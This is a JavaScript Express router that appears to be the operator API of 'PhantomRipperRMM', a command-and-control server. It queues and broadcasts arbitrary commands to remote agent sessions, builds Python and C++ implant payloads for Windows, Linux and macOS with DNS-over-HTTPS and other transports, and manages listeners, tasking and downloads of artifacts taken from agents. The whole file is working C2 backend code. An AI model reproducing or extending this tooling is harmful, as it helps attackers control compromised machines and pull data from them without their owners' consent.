'use strict';

/**
 * PhantomRipperRMM — operator API (authenticated).
 */

const express = require('express');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const auth = require('../auth');
const sessions = require('../sessionManager');
const builder = require('../builder');
const ws = require('../ws');
const config = require('../config');
const store = require('../store');

const router = express.Router();
router.use(auth.requireAuth);

const upload = multer({ dest: path.join(config.buildDir, 'uploads') });

// ---- diagnostics -----------------------------------------------------------

router.get('/db', async (req, res) => {
  let ok = false;
  let error = null;
  try { ok = await store.ping(); } catch (e) { error = e.message; }
  res.json({
    dialect: store.dialect,
    connected: ok,
    error,
    mysql: !!config.mysqlUrl,
  });
});

// ---- stats & events --------------------------------------------------------

router.get('/stats', async (req, res) => {
  const s = await sessions.stats();
  res.json({ ...s, online: ws.onlineAgents() });
});

router.get('/events', async (req, res) => {
  const limit = Math.min(parseInt(req.query.limit || '100', 10), 500);
  res.json(await sessions.recentEvents(limit));
});

// ---- sessions --------------------------------------------------------------

router.get('/sessions', async (req, res) => {
  res.json(await sessions.getSessions(req.query.status));
});

router.get('/sessions/:id', async (req, res) => {
  const session = await sessions.getSession(req.params.id);
  if (!session) return res.status(404).json({ error: 'not found' });
  const history = await sessions.getHistory(req.params.id, parseInt(req.query.limit || '200', 10));
  res.json({ session, history, online: ws.onlineAgents().includes(req.params.id) });
});

router.delete('/sessions/:id', auth.requireRole('admin', 'operator'), async (req, res) => {
  const ok = await sessions.deleteSession(req.params.id);
  if (!ok) return res.status(404).json({ error: 'not found' });
  ws.bus.emit('event', { type: 'session_deleted', payload: { sessionId: req.params.id } });
  res.json({ status: 'deleted' });
});

router.get('/sessions/:id/history', async (req, res) => {
  res.json(await sessions.getHistory(req.params.id, parseInt(req.query.limit || '200', 10)));
});

// ---- commands --------------------------------------------------------------

router.post('/sessions/:id/command', async (req, res) => {
  const { command } = req.body || {};
  if (!command) return res.status(400).json({ error: 'command required' });
  const session = await sessions.getSession(req.params.id);
  if (!session) return res.status(404).json({ error: 'session not found' });

  await sessions.queueCommand(req.params.id, command, req.user.username);

  const delivered = ws.pushCommand(req.params.id, command);
  if (delivered) await sessions.nextCommand(req.params.id);

  ws.bus.emit('event', {
    type: 'command_queued',
    payload: { sessionId: req.params.id, command, by: req.user.username, delivered },
  });
  res.json({ status: 'queued', delivered });
});

router.post('/broadcast', async (req, res) => {
  const { command, session_ids: ids } = req.body || {};
  if (!command || !Array.isArray(ids)) return res.status(400).json({ error: 'command and session_ids required' });
  let count = 0;
  for (const id of ids) {
    if (await sessions.getSession(id)) {
      await sessions.queueCommand(id, command, req.user.username);
      ws.pushCommand(id, command);
      count += 1;
    }
  }
  res.json({ queued: count });
});

// ---- payload builder -------------------------------------------------------

router.get('/builders/options', (req, res) => {
  res.json({
    agent_types: [
      { value: 'python', label: 'Python (cross-platform)' },
      { value: 'cpp', label: 'C++ (Windows native)' },
    ],
    os_targets: ['windows', 'linux', 'macos'],
    transports: ['https', 'doh', 'ws', 'tcp'],
    c2: config.c2,
  });
});

router.post('/builders/build', auth.requireRole('admin', 'operator'), async (req, res) => {
  try {
    const result = await builder.buildPayload(req.body || {}, req.user.username);
    res.json(result);
  } catch (err) {
    await sessions.logEvent('payload', `build failed: ${err.message}`, 'error');
    res.status(500).json({ error: err.message });
  }
});

router.get('/payloads', async (req, res) => {
  res.json(await sessions.getPayloads());
});

router.get('/payloads/:id/download', async (req, res) => {
  const list = await sessions.getPayloads();
  const p = list.find((x) => x.id === req.params.id);
  if (!p) return res.status(404).json({ error: 'not found' });
  const file = path.join(config.buildDir, p.filename);
  if (!fs.existsSync(file)) return res.status(404).json({ error: 'artifact missing' });
  res.download(file, p.filename);
});

// ---- tasks (structured) ----------------------------------------------------

router.post('/sessions/:id/task', auth.requireRole('admin', 'operator'), async (req, res) => {
  const { verb, args } = req.body || {};
  if (!verb) return res.status(400).json({ error: 'verb required' });
  const session = await sessions.getSession(req.params.id);
  if (!session) return res.status(404).json({ error: 'session not found' });

  const task = await sessions.createTask(req.params.id, verb, args || '', req.user.username);
  if (!task) return res.status(404).json({ error: 'session not found' });

  // Push over WS when the agent is online (task-aware agents parse this).
  const command = JSON.stringify(task);
  const delivered = ws.pushCommand(req.params.id, command);
  if (delivered) await sessions.nextTask(req.params.id);

  ws.bus.emit('event', {
    type: 'task_queued',
    payload: { sessionId: req.params.id, task, by: req.user.username, delivered },
  });
  res.json({ status: 'queued', task, delivered });
});

router.get('/sessions/:id/tasks', async (req, res) => {
  res.json(await sessions.getTasks(req.params.id, parseInt(req.query.limit || '200', 10)));
});

// ---- artifacts ---------------------------------------------------------------

router.get('/artifacts', async (req, res) => {
  res.json(await sessions.getArtifacts(req.query.session || null));
});

router.get('/artifacts/:id/download', async (req, res) => {
  const meta = await sessions.getArtifact(req.params.id);
  if (!meta) return res.status(404).json({ error: 'not found' });
  if (!fs.existsSync(meta.path)) return res.status(404).json({ error: 'file missing' });
  res.download(meta.path, meta.name || 'artifact.bin');
});

router.delete('/artifacts/:id', auth.requireRole('admin', 'operator'), async (req, res) => {
  const meta = await sessions.getArtifact(req.params.id);
  if (!meta) return res.status(404).json({ error: 'not found' });
  try { if (meta.path && fs.existsSync(meta.path)) fs.unlinkSync(meta.path); } catch (_) { /* noop */ }
  await store.run('DELETE FROM artifacts WHERE id = ?', [req.params.id]);
  res.json({ status: 'deleted' });
});

// ---- listeners -------------------------------------------------------------

router.get('/listeners', async (req, res) => {
  res.json(await sessions.getListeners());
});

router.post('/listeners', auth.requireRole('admin', 'operator'), async (req, res) => {
  const { name, transport, host, port, path: lpath, profile } = req.body || {};
  if (!name || !transport) return res.status(400).json({ error: 'name and transport required' });
  const id = await sessions.createListener({ name, transport, host, port, path: lpath, profile });
  res.json({ id });
});

router.delete('/listeners/:id', auth.requireRole('admin'), async (req, res) => {
  res.json({ status: (await sessions.deleteListener(req.params.id)) ? 'deleted' : 'not found' });
});

// ---- file upload -----------------------------------------------------------

router.post('/upload', upload.single('file'), (req, res) => {
  if (!req.file) return res.status(400).json({ error: 'file required' });
  res.json({ id: req.file.filename, original: req.file.originalname, size: req.file.size });
});

module.exports = router;
